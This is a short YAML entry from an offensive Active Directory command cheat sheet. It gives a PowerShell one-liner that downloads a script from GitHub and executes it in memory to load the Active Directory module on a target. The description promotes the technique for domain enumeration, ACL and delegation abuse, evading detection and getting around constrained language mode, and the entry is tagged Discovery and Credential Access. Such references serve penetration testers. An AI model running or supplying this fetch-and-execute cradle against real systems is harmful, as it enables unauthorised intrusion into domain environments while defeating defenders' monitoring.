---
description: | 
    The Active Directory Module from powershell can be used to preform most needed enumaration tasks as well as some exploitation tasks revoling around ACL/DACL/Delegation abuse. The modules does not need to be installed on the target, it is signed by microsoft and thus greatly reduces the risk of detection and lastly works without restriction in constrained language mode(CLM). This entry focused on downloading and importing it in memory for a given session, one liners can be found in other entries of WADCOMs

command: |
    iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
OS:
   - Windows
attack_types:
    - Discovery
    - Credential Access
references:
    - https://docs.microsoft.com/en-us/powershell/module/activedirectory/
    - https://github.com/samratashok/ADModule
    - https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html

---